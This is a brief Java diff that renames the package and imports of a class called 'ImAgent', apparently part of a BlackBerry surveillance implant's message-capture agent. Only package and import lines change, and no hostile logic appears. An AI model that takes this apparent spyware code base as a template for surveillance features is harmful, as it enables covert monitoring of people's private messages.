@@ -1,7 +1,7 @@
-package com.ht.rcs.blackberry.agent;
+package blackberry.agent;
 
-import com.ht.rcs.blackberry.utils.Debug;
-import com.ht.rcs.blackberry.utils.DebugLevel;
+import blackberry.utils.Debug;
+import blackberry.utils.DebugLevel;
 
 public class ImAgent extends Agent {
     //#debug
